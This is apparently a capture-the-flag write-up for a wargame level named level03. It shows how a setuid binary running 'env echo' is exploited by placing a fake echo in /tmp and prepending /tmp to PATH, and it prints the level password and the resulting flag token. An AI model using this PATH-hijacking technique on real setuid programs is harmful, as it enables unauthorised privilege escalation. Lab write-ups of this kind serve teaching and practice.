su level03 -> kooda2puivaav1idi4f57q8iq

Check the permissions of the file:

```
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

The binary is owned by flag03, and it prints "Exploit Me". it also has the s permission, which means it will be run as flag03, so we would like this binary to execute getflag.

With ltrace level03, we see that this executable runs the line: system("/usr/bin/env echo Exploit me").

We try to modify echo with `echo getflag > /bin/echo` but i obviously doesn't work.

One exploit that is present in the level03 executable, is that echo is not designed with an absolute path, so we could make it use our own echo.

```
echo getflag > /tmp/echo
chmod +x /tmp/echo
export PATH="/tmp:$PATH"
./level03
```

./level03 -> Check flag.Here is your token : qi0maab88jeaj46qoumi7maus